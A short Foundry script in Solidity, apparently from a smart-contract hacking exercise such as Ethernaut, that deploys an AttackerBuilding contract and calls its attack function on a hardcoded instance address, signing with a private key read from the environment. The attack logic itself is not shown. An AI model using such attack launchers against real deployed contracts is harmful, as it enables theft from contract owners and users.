// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/AttackerBuilding.sol";

contract ReentranceScript is Script {
    
    address instance = 0xbDeAb98ef022EfE1f29A4A882784E0fb4F4D6205;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackerBuilding attacker = new AttackerBuilding();
        attacker.attack(instance);
        vm.stopBroadcast();
    }
}
